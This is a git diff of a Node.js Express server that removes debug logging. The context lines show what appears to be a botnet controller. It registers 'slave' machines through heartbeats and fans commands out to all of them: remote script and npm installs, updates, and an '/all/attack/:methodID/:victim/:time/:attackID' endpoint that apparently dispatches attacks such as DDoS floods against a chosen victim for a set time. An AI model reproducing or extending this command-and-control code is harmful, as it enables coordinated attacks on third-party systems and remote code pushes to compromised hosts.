@@ -394,8 +394,6 @@ app.get('/setup', (req, res) => {
     let scid = ([Object.keys(req.query)[0]][0]);
     let detid = ([Object.keys(req.query)[1]][0]);
     //console.log(scid, detid);
-    console.log(Object.keys(slaveInfo.setup));
-    console.log(scid);
     if (!((Object.keys(slaveInfo.setup)).includes(scid))) {
         res.send(200, slaveInfo.setup)
     } else {
@@ -437,7 +435,7 @@ app.post('/heartbeat', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     ip = ip.toString().replace('::ffff:', '');
     let machine = req.body.machine
-    console.log(machine);
+    //console.log(machine);
     Machines.all[ip] = {
         id: ip,
         machine
@@ -472,7 +470,6 @@ app.get('/all/installscript/:scriptid', async (req, res) => {
         machines.asked.push(currentMachine)
         axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/installScript/${req.params.scriptid}`)
             .then(res => {
-                console.log(res.data)
                 machines.responded.push(currentMachine)
             })
             .catch(err => {
@@ -496,7 +493,6 @@ app.get('/all/npminstall/:module', async (req, res) => {
         machines.asked.push(currentMachine)
         await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/npminstall/${req.params.module}`)
             .then(res => {
-                console.log(res.data)
                 machines.responded.push(currentMachine)
             })
             .catch(err => {
@@ -519,7 +515,6 @@ app.get('/all/attack/:methodID/:victim/:time/:attackID', async (req, res) => {
         machines.asked.push(currentMachine)
         await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
-                console.log(res.data)
                 machines.responded.push(currentMachine)
             })
             .catch(err => {
@@ -542,7 +537,6 @@ app.get('/all/update', async (req, res) => {
         machines.asked.push(currentMachine)
         await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/update`)
             .then(res => {
-                console.log(res.data)
                 machines.responded.push(currentMachine)
             })
             .catch(err => {
@@ -579,7 +573,6 @@ app.get('/machines/testReachability/', async (req, res) => {
         machines.asked.push(currentMachine)
         await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/status`)
             .then(res => {
-                console.log(res.data)
                 machines.responded.push(currentMachine)
             })
             .catch(err => {
